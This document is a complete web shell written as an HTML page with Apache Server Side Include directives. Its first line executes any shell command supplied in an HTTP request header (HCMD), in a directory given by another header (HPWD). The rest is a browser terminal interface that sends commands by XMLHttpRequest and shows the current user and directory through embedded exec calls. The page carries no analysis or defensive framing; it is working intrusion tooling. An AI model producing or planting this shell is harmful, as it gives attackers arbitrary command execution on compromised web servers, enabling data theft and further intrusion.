<!--#if expr="$HTTP_HCMD"--><!--#exec cmd="cd $HTTP_HPWD; $HTTP_HCMD 2>&1"--><!--#else--><html><head><title>P.S.S.</title><style type="text/css">html,body,#json,xmp,form,table,table td,input{margin:0;padding:0;}html{background:#000000;}.err{padding:8px;text-align:center;border:1px solid red;background:#ffffff;}#jsoff{margin:5px 8px;}#json{display:none; padding:5px 8px;}xmp,table,input{font:normal 9pt "Courier New";color:#f0f0f0;border:none;}table{width:100%;border-collapse:collapse;}.tdnbr{white-space:pre;}input{outline:none; background:#000000;}input::-moz-focus-inner{border:none;}</style><script type="text/javascript">var rez,cmd,hist,usr,srv,pwd,susr,spwd;function trim(str){return str.replace(/(^\s+)|(\s+$)/g, "");}function init(){rez=document.getElementById('rez');cmd=document.getElementById('cmd');hist=document.getElementById('hist');susr=document.getElementById('susr');spwd=document.getElementById('spwd');usr=trim(document.getElementById('usr').value);srv=document.getElementById('ssrv').innerHTML;pwd=trim(document.getElementById('pwd').value);document.getElementById('jsoff').style.display='none';document.getElementById('json').style.display='block';if(susr.innerText){susr.innerText=usr;spwd.innerText=pwd;}else{susr.textContent=usr;spwd.textContent=pwd;}cmd.focus();<!--#if expr=""-->
document.getElementById('ssion').style.display='none';<!--#endif-->
}function endCmd(){if(susr.innerText)cmd.value='';else{cmd.blur();cmd.value='';cmd.focus();}document.body.scrollTop=document.body.scrollHeight;}function sendCmd(){var cmdValue=cmd.value;if(hist.options){var isUnique=true,optCount=hist.options.length;for(var i=0;i<optCount;i++)if(hist.options[i].value==cmdValue){isUnique=false;break;}if(isUnique)hist.appendChild(new Option(cmdValue,cmdValue));}if(cmdValue=='clear'){rez.innerHTML='';endCmd();}else if(cmdValue=='exit')window.close();else if(cmdValue!=''){var ajax=new XMLHttpRequest();ajax.cmd=cmdValue;if(cmdValue.substr(0,3)=='cd ')cmdValue+=' 2>&1; pwd';ajax.open('GET',document.URL,true);ajax.onreadystatechange=onStatusChange;ajax.setRequestHeader('HUSR',usr);ajax.setRequestHeader('HPWD',pwd);ajax.setRequestHeader('HCMD',cmdValue);ajax.send(null);}}function onStatusChange(){if(this.readyState==4){if(this.status==200){var res=usr+'@'+srv+':'+pwd+'$ '+this.cmd+'\n';if(this.cmd.substr(0,3)=='cd '){if(this.responseText.indexOf("can't cd")==-1){pwd=trim(this.responseText);if(pwd.innerText)spwd.innerText=pwd;else spwd.textContent=pwd;res+='\n';}else res+='can\'t cd '+this.cmd.substr(3)+'\n\n';}else res+=this.responseText;if(rez.innerText)rez.innerText+=res;else rez.textContent+=res;endCmd();}else alert("ERROR:\nStatus: "+this.status+" ("+this.statusText+")\nCommand: "+this.cmd);}}</script></head><body onload="init()"><div id="jsoff" class="err">Can't work without javascript. Sorry.</div><div id="json"><!--#if expr=""--><div class="err">SSI not work. Sorry.</div><!--#endif--><div id="ssion"><xmp id="rez"></xmp><form action="" method="post" onsubmit="sendCmd(); return false"><table border="0"><tr><td width="10px" class="tdnbr"><span id="susr"></span>@<span id="ssrv"><!--#echo var="SERVER_NAME"--></span>:<span id="spwd"></span>$ </td><td><input type="text" id="cmd" style="width:100%" list="hist"/></td><td width="10px"><input type="submit" value="&gt;&gt;"/></td></tr></table><datalist id="hist"></datalist><input type="hidden" id="usr" value="<!--#exec cmd="whoami"-->"/><input type="hidden" id="pwd" value="<!--#exec cmd="pwd"-->"/></form></div></div></body></html><!--#endif-->
